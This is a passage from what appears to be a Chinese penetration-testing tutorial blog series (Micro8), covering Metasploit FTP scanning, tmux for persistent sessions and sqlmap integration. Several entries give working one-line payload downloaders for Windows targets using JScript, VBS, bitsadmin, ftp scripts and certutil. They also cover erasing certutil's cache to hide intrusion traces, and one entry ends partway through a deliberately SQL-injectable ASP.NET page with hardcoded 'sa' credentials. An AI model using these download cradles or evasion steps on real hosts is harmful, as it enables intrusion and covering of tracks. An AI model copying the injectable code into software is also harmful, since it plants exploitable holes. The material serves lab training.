      <url>/article/43_js%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html</url>
      
        <content type="html"><![CDATA[<p>windows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。</p><p><strong>靶机：</strong>windows 2003  </p><h3 id="读取："><a href="#读取：" class="headerlink" title="读取："></a>读取：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\test&gt;cscript /nologo downfile.js http://192.168.1.115/robots.txt</span><br><span class="line">```  </span><br><span class="line">![](../do/media/ac794b7eb3758d954dbf95912895dd41.jpg)</span><br><span class="line"></span><br><span class="line">### 附代码：</span><br><span class="line">```javascript</span><br><span class="line">var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">WScript.Echo(WinHttpReq.ResponseText);</span><br></pre></td></tr></table></figure><h3 id="写入："><a href="#写入：" class="headerlink" title="写入："></a>写入：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\test&gt;cscript /nologo dowfile2.js http://192.168.1.115/robots.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/21081f49afc31e94235293e3337967b7.jpg" alt></p><h3 id="附代码："><a href="#附代码：" class="headerlink" title="附代码："></a>附代码：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WinHttpReq = <span class="keyword">new</span> ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</span><br><span class="line">WinHttpReq.Open(<span class="string">"GET"</span>, WScript.Arguments(<span class="number">0</span>), <span class="comment">/*async=*/</span><span class="literal">false</span>);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line"></span><br><span class="line">BinStream = <span class="keyword">new</span> ActiveXObject(<span class="string">"ADODB.Stream"</span>); BinStream.Type = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(<span class="string">"micropoor.exe"</span>);</span><br></pre></td></tr></table></figure><blockquote><p>后者的话：简单，易用，轻便。</p><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>42、攻击FTP服务</title>
      <link href="/article/42_%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1.html"/>
      <url>/article/42_%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1.html</url>
      
        <content type="html"><![CDATA[<p>在办公区的内网中，充斥着大量的 ftp 文件服务器。其中不乏有部分敏感文件，也许有你需要的密码文件，也许有任务中的目标文件等。本季从讲述内网ftp服务器的发现以及常用的相关模块。</p><p><strong>靶机介绍：</strong>  </p><ul><li>靶机一：Windows 2003 | 192.168.1.115  </li><li>靶机二：Debian | 192.168.1.5</li></ul><p>msf 内置 search 模块，在实战中，为了更快速的找到对应模块，它提供了 type 参数（未来会具体讲到模块参数），以 ftp 模块为例。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search type:auxiliary ftp</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line"> ================</span><br><span class="line"></span><br><span class="line">Name Disclosure Date Rank Description</span><br><span class="line">---- --------------- ---- -----------</span><br><span class="line">auxiliary/admin/cisco/vpn_3000_ftp_bypass 2006-08-23 normal Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access</span><br><span class="line">auxiliary/admin/officescan/tmlisten_traversal normal TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access</span><br><span class="line">auxiliary/admin/tftp/tftp_transfer_util normal TFTP File Transfer Utility</span><br><span class="line">auxiliary/dos/scada/d20_tftp_overflow 2012-01-19 normal General Electric D20ME TFTP Server Buffer Overflow DoS</span><br><span class="line">auxiliary/dos/windows/ftp/filezilla_admin_user 2005-11-07 normal FileZilla FTP Server Admin Interface Denial of Service</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><img src="../do/media/9f4d6fb344a6812126526c03dc4cdb2e.jpg" alt></p><h3 id="auxiliary-scanner-ftp-ftp-version"><a href="#auxiliary-scanner-ftp-ftp-version" class="headerlink" title="auxiliary/scanner/ftp/ftp_version"></a>auxiliary/scanner/ftp/ftp_version</h3><p><img src="../do/media/afc593576266cfa54f2dcd0eeefcfa81.jpg" alt></p><h3 id="auxiliary-scanner-ftp-ftp-login"><a href="#auxiliary-scanner-ftp-ftp-login" class="headerlink" title="auxiliary/scanner/ftp/ftp_login"></a>auxiliary/scanner/ftp/ftp_login</h3><p><img src="../do/media/6d172564dfc97a31f39366bedca0baf9.jpg" alt></p><h3 id="auxiliary-scanner-ftp-anonymous"><a href="#auxiliary-scanner-ftp-anonymous" class="headerlink" title="auxiliary/scanner/ftp/anonymous"></a>auxiliary/scanner/ftp/anonymous</h3><p><img src="../do/media/956d2d88181d499ab543583448d60aa9.jpg" alt></p><p>当然 msf 也内置了 nmap，来内网大量发现 FTP 存活主机，参数与使用与 nmap 一致。  </p><pre><code class="code">msf auxiliary(scanner/ftp/anonymous) &gt; db_nmap -sS -T4 -p21 192.168.1.115</code></pre><p><img src="../do/media/79c9ed79b71ccc537313c6b1bbd2d477.jpg" alt></p><p>msf 更多针对了 ftpd。<br><img src="../do/media/f96780563285d4c96f6acefa51214740.jpg" alt></p><h3 id="ftp本地模糊测试辅助模块："><a href="#ftp本地模糊测试辅助模块：" class="headerlink" title="ftp本地模糊测试辅助模块："></a>ftp本地模糊测试辅助模块：</h3><p><img src="../do/media/7cf2c4df632790edc7b4af6042f58388.jpg" alt></p><h3 id="auxiliary-fuzzers-ftp-ftp-pre-post"><a href="#auxiliary-fuzzers-ftp-ftp-pre-post" class="headerlink" title="auxiliary/fuzzers/ftp/ftp_pre_post"></a>auxiliary/fuzzers/ftp/ftp_pre_post</h3><p><img src="../do/media/20cdea228c480bc89f22f69987d877df.jpg" alt></p><p>关于 ftp 的本地 fuzzer，更推荐的是本地fuzz，msf 做辅助 poc。<br><img src="../do/media/d19bd4335259bd091a4ab4e9e6ba3fe5.jpg" alt></p><p><img src="../do/media/06293311884d5469f50199e889ede3f6.jpg" alt></p><p>关于后期利用，poc编写，在未来的季中会继续讲述。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>41、bitsadmin一句话下载payload</title>
      <link href="/article/41_bitsadmin%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html"/>
      <url>/article/41_bitsadmin%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html</url>
      
        <content type="html"><![CDATA[<p><strong>微软官方做出如下解释：</strong>  </p><blockquote><p>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。</p></blockquote><p><strong>具体相关参数参见官方文档：</strong><br><a href="https://docs.microsoft.com/zh-cn/windows/desktop/Bits/bitsadmin-tool" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/desktop/Bits/bitsadmin-tool</a></p><p>自 windows7 以上版本内置 bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。</p><p><strong>靶机：windows 7</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;bitsadmin /rawreturn /transfer down &quot;http://192.168.1.115/robots.txt&quot; E:\PDF\robots.txt</span><br><span class="line">```  </span><br><span class="line">![](../do/media/68d44cdc3d8dfab1799b7becdd141031.jpg)</span><br><span class="line"></span><br><span class="line">需要注意的是，bitsadmin要求服务器支持Range标头。</span><br><span class="line"></span><br><span class="line">如果需要下载过大的文件，需要提高优先级。配合上面的下载命令。再次执行</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">bitsadmin /setpriority down foreground</span><br></pre></td></tr></table></figure><p>如果下载文件在1-5M之间，需要时时查看进度。同样它也支持进度条。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer down /download /priority normal &quot;http://192.168.1.115/robots.txt&quot; E:\PDF\robots.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/362901f0c27b936f6065b7b91b567395.jpg" alt></p><blockquote><p>  后者的话：不支持https协议。  </p><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>40、ftp一句话下载payload</title>
      <link href="/article/40_ftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html"/>
      <url>/article/40_ftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html</url>
      
        <content type="html"><![CDATA[<h3 id="windows-全平台自带ftp，在实战中需要考虑两点："><a href="#windows-全平台自带ftp，在实战中需要考虑两点：" class="headerlink" title="windows 全平台自带ftp，在实战中需要考虑两点："></a>windows 全平台自带ftp，在实战中需要考虑两点：</h3><ul><li>数据传输的完整性。  </li><li>代码得精简</li></ul><h3 id="ftp文件的传输方式："><a href="#ftp文件的传输方式：" class="headerlink" title="ftp文件的传输方式："></a>ftp文件的传输方式：</h3><ul><li>Binary ，二进制传输  </li><li>Ascii ，ascII传输</li></ul><p>在 FTP 文件传输过程中，ASCII 传输 HTML 和文本编写的文件，而二进制码传输可以传送文本和非文本（执行文件，压缩文件，图片等），具有通用性，二进制码传输速度比 ASCII 传输要快。所以在建立 bat 脚本时，一般输入 bin 命令，启用二进制传输。如果用 ASCII 模式传输非文本文件，可能会显示一堆乱码。ASCII 和binary 模式的区别是回车换行的处理。binary 模式不对数据进行任何处理，ASCII 模式将回车换行转换为本机的回车字符，比如Unix 下是 <code>\n</code>, Windows 下是<code>\r\n</code>，Mac 下是<code>\r</code>。Unix 系统下行结束符是一个字节，即十六进制的 <code>0A</code>，而 ms 的系统是两个字节，即十六进制的 <code>0D0A</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.1.115 21&gt; ftp.txt</span><br><span class="line">echo 123&gt;&gt; ftp.txt //user</span><br><span class="line">echo 123&gt;&gt; ftp.txt //password</span><br><span class="line">echo binary &gt;&gt; ftp.txt //bin模式</span><br><span class="line">echo get robots.txt &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/c5c7ac3159ec54aebb31f66d8de10af7.jpg" alt></p><p><img src="../do/media/c165fc58678e3ce58625166bd8a2b927.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>39、vbs一句话下载payload补充</title>
      <link href="/article/39_vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85.html"/>
      <url>/article/39_vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85.html</url>
      
        <content type="html"><![CDATA[<p>在实战中，会碰到许多让人敬畏的环境，也许无法执行，或者无法把下载参数带入其中，故补充第七季 vbs 参数化的下载。</p><p><strong>靶机：</strong>windows 2003<br><img src="../do/media/130baad813eacf09b1932ecb7e5d4279.jpg" alt></p><p><img src="../do/media/d434ad0c2a6c5f531e908fedca5f2044.jpg" alt></p><h3 id="附：源码如下："><a href="#附：源码如下：" class="headerlink" title="附：源码如下："></a>附：源码如下：</h3><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL = &quot;http://192.168.1.115/robots.txt&quot;</span><br><span class="line">strHDLocation = &quot;c:\\test\\logo.txt&quot;</span><br><span class="line">Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status = 200 Then</span><br><span class="line">Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type = 1</span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position = 0</span><br><span class="line">Set objFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocati on</span><br><span class="line">Set objFSO = Nothing</span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line">Set objADOStream = Nothing</span><br><span class="line">End if</span><br><span class="line">Set objXMLHTTP = Nothing</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>38、certutil一句话下载payload</title>
      <link href="/article/38_certutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html"/>
      <url>/article/38_certutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html</url>
      
        <content type="html"><![CDATA[<h3 id="certutil微软官方是这样对它解释的："><a href="#certutil微软官方是这样对它解释的：" class="headerlink" title="certutil微软官方是这样对它解释的："></a>certutil微软官方是这样对它解释的：</h3><blockquote><p>Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。  </p></blockquote><p>url:<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732443(v=ws.11)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732443(v=ws.11)</a></p><p>但是近些年好像被玩坏了。</p><p><strong>靶机：</strong>windows 2003 windows 7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/d5ad3e478f8b4df59283786537e748f6.jpg" alt></p><p>默认下载为bin文件。但是不影响在命令行下使用。<br><img src="../do/media/346d182aad2fafe6b894d0b08c994e0e.jpg" alt></p><p>certutil.exe 下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次下载后，<strong>需要马上执行如下</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete</span><br></pre></td></tr></table></figure><p><img src="../do/media/1e7636c8225aaf3cd99d81bd44afeff9.jpg" alt></p><p>而在应急中certutil也是常用工具之一，来对比文件hash，来判断疑似文件。</p><p><strong>Windows 2003：</strong><br><img src="../do/media/4dd859482e45ae5632c0302798c69329.jpg" alt></p><p><strong>Windows 7：</strong><br><img src="../do/media/edec57e27ee820bc6c423481454ee6fc.jpg" alt></p><h3 id="certutil的其它高级应用："><a href="#certutil的其它高级应用：" class="headerlink" title="certutil的其它高级应用："></a>certutil的其它高级应用：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;certutil -encode c:\downfile.vbs downfile.bat</span><br></pre></td></tr></table></figure><p><img src="../do/media/cb14f787f5f65099047d739544e41dbc.jpg" alt></p><p><strong>file:downfile.bat</strong>  </p><p><img src="../do/media/b659cc22fd3ef3bc8931857f8a255c44.jpg" alt></p><p><strong>解密：</strong><br><img src="../do/media/bdb9cc7f59e382ddb3e607e704bea481.jpg" alt></p><p><strong>file:downfile.txt</strong><br><img src="../do/media/f0e6d3203cc514f0a7c611453246da1e.jpg" alt></p><blockquote><p>后者的话：powershell内存加载配合certutil解密是一件非常有趣的事情。会在未来的系列中讲述。</p></blockquote><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>37、vbs一句话下载payload</title>
      <link href="/article/37_vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html"/>
      <url>/article/37_vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html</url>
      
        <content type="html"><![CDATA[<p>一次 msf 完整的流程离不开目标机的 payload 下载与执行。而针对不同环境目标，考虑或者选择不同方式的 payload 下载与执行。如 webshell 下，注入点下。smb 下等。而针对不同的实际环境，来做最好的选择。</p><p>既然本季开始专门针对 windows 下的 payload 下载讲解，那么就需要考虑到目标机的系统版本，是windows2000，windows 2003，或者是更高的版本如 windows 2016等。</p><p>无论是哪个版本的windows系列，都是支持vbs的。</p><p><strong>靶机：</strong>windows 2003  </p><h3 id="vbs："><a href="#vbs：" class="headerlink" title="vbs："></a>vbs：</h3><p>保存downfile.vbs</p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set a=createobject(&quot;adod&quot;+&quot;b.stream&quot;):set</span><br><span class="line">w=createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open &quot;get&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile</span><br><span class="line">wsh.arguments(1),2</span><br></pre></td></tr></table></figure><h3 id="命令行下执行："><a href="#命令行下执行：" class="headerlink" title="命令行下执行："></a>命令行下执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/7f46749ce580dd58f217f4757f5f6529.jpg" alt></p><p>往往在实战中，没有上传的方便条件，尤其是目标机是 windows，只有 echo 方式来写入 vbs。</p><h3 id="命令行下执行：-1"><a href="#命令行下执行：-1" class="headerlink" title="命令行下执行："></a>命令行下执行：</h3><pre><code class="code">echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):setw=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofilewsh.arguments(1),2 &gt;&gt;downfile.vbs</code></pre><p><strong>优点：</strong>支持windows全版本系列<br><strong>缺点：</strong>对https不友好</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>36、解决vps上ssh掉线</title>
      <link href="/article/36_%E8%A7%A3%E5%86%B3vps%E4%B8%8Assh%E6%8E%89%E7%BA%BF.html"/>
      <url>/article/36_%E8%A7%A3%E5%86%B3vps%E4%B8%8Assh%E6%8E%89%E7%BA%BF.html</url>
      
        <content type="html"><![CDATA[<p>在写第五季的时候，vps 掉线了，ssh 重新登录后，无法切到 MSF session 下，想到部分同学如果在 vps 上操作也会遇到这个问题，故本季解决该问题。</p><h3 id="tmux是什么？"><a href="#tmux是什么？" class="headerlink" title="tmux是什么？"></a>tmux是什么？</h3><p>Tmux是一个优秀的终端复用软件，类似GNU Screen，但来自于OpenBSD，采用BSD授权。使用它最直观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机。是BSD实现的Screen替代品，相对于Screen，它更加先进：支持屏幕切分，而且具备丰富的命令行参数，使其可以灵活、动态的进行各种布局和操作。</p><h3 id="Tmux的使用场景"><a href="#Tmux的使用场景" class="headerlink" title="Tmux的使用场景"></a>Tmux的使用场景</h3><ol><li>可以某个程序在执行时一直是输出状态，需要结合nohup、&amp;来放在后台执行，并且ctrl+c结束。这时可以打开一个Tmux窗口，在该窗口里执行这个程序，用来保证该程序一直在执行中，只要Tmux这个窗口不关闭  </li><li>公司需要备份数据库时，数据量巨大，备份两三天弄不完，这时不小心关闭了终端窗口或误操作就前功尽弃了，使用Tmux会话运行命令或任务，就不用担心这些问题。  </li><li>下班后，你需要断开ssh或关闭电脑，将运行的命令或任务放置后台运行。  </li><li>关闭终端,再次打开时原终端里面的任务进程依然不会中断  </li><li>在渗透过程中，意外因网络等原因ssh掉线，tmux可以恢复session会话</li></ol><p><img src="../do/media/d47fa61934f99368662fb6fb6dd39d84.jpg" alt></p><p><img src="../do/media/1b621f6005d83138d3a71662a08ac9d0.jpg" alt></p><p><img src="../do/media/49159b718def6a0fe947df35f156c680.jpg" alt></p><h3 id="tmux-常用操作命令："><a href="#tmux-常用操作命令：" class="headerlink" title="tmux 常用操作命令："></a>tmux 常用操作命令：</h3><ul><li>tmux new -s session1 新建会话  </li><li>ctrl+b d 退出会话，回到shell的终端环境 //tmux detach-client   </li><li>tmux ls 终端环境查看会话列表  </li><li>ctrl+b s 会话环境查看会话列表  </li><li>tmux a -t session1 从终端环境进入会话  </li><li>tmux kill-session -t session1 销毁会话  </li><li>tmux rename -t old_session_name new_session_name 重命名会话  </li><li>ctrl + b $ 重命名会话 (在会话环境中)  </li></ul><p>还原会话<br><img src="../do/media/c3741ac0522e6ae0e9c0e232caf06aef.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>35、与Sqlmap结合攻击</title>
      <link href="/article/35_%E4%B8%8ESqlmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB.html"/>
      <url>/article/35_%E4%B8%8ESqlmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB.html</url>
      
        <content type="html"><![CDATA[<p>msf 在非 session 模式下与 session 模式下都支持第三方的加载与第三方框架的融合。代表参数为 load。两种模式下的 load 意义不同。本季主要针对非 session 模式下的 load sqlmap情景。<br><img src="../do/media/0b8b7eb912d7d46bf6e6f1dfd636bfeb.jpg" alt></p><p><img src="../do/media/65e1410fa83b3a40611d3d8bfcc3ddee.jpg" alt></p><h3 id="加载Sqlmap后，主要参数如下："><a href="#加载Sqlmap后，主要参数如下：" class="headerlink" title="加载Sqlmap后，主要参数如下："></a>加载Sqlmap后，主要参数如下：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap Commands</span><br><span class="line">=============== </span><br><span class="line"></span><br><span class="line">Command Description</span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">sqlmap_connect sqlmap_connect &lt;host&gt; [&lt;port&gt;]</span><br><span class="line">sqlmap_get_data Get the resulting data of the task</span><br><span class="line">sqlmap_get_log Get the running log of a task</span><br><span class="line">sqlmap_get_option Get an option for a task</span><br><span class="line">sqlmap_get_status Get the status of a task</span><br><span class="line">sqlmap_list_tasks List the knows tasks. New tasks are not stored in DB,so lives as long as the console does</span><br><span class="line">sqlmap_new_task Create a new task</span><br><span class="line">sqlmap_save_data Save the resulting data as web_vulns</span><br><span class="line">sqlmap_set_option Set an option for a task</span><br><span class="line">sqlmap_start_task Start the task</span><br><span class="line">msf exploit(multi/handler) &gt; help sqlmap</span><br></pre></td></tr></table></figure><p>help 加载的模块名，为显示第三方的帮助文档。<br><img src="../do/media/e7e0f046ae5d01be11380d39684930f5.jpg" alt>  </p><p>msf 上的 sqlmap 插件依赖于 sqlmap 的 sqlmapapi.py 在使用前需要启动sqlmapapi.py  </p><p><img src="../do/media/f878d0036fa5a7b15a07fd062e61f30c.jpg" alt></p><p>然后在msf上建立任务。</p><p>而 sqlmap 对 msf 也完美支持。</p><p><strong>靶机：</strong><br>192.168.1.115，Sql server 2005 + aspx.net</p><p>构造注入点，如图1：  </p><p><img src="media/bf195a288663fc6a43042f6dd53a160d.jpg" alt="图1：">  </p><p>数据结构，如图2：<br><img src="../do/media/b0c52a380dc2c1ea276e444e5ef8997b.jpg" alt></p><p><img src="../do/media/e26356b1e7bcaceeb258ce8f83abf40e.jpg" alt></p><p><img src="../do/media/01023a8686d914895d7e7c7a5e488051.jpg" alt></p><p><img src="../do/media/c62298dd3c15e08f9410010f806e8ecc.jpg" alt></p><p><img src="../do/media/f637ac23d411e42618bb33fcbb16dc54.jpg" alt></p><p>关于msf与sqlmap的结合在未来的系列中还会继续讲述，本季作为基础。</p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p>注入点代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">Page</span> <span class="attr">Language</span>=<span class="string">"C#"</span> <span class="attr">AutoEventWireup</span>=<span class="string">"true"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">Import</span> <span class="attr">Namespace</span>=<span class="string">"System.Data"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">Import</span> <span class="attr">namespace</span>=<span class="string">"System.Data.SqlClient"</span> %&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line">private DataSet resSet=new DataSet();</span><br><span class="line">protected void Page_Load(object sender, EventArgs e)</span><br><span class="line"> &#123;</span><br><span class="line">String strconn = "server=.;database=xxrenshi;uid=sa;pwd=123456";</span><br><span class="line">string id = Request.Params["id"];</span><br><span class="line">//string sql = string.Format("select * from admin where id=&#123;0&#125;", id);</span><br><span class="line">string sql = "select * from sys_user where id=" + id;</span><br><span class="line">SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">connection.Open();</span><br><span class="line">SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">dataAdapter.Fill(resSet);</span><br><span class="line">DgData.DataSource = 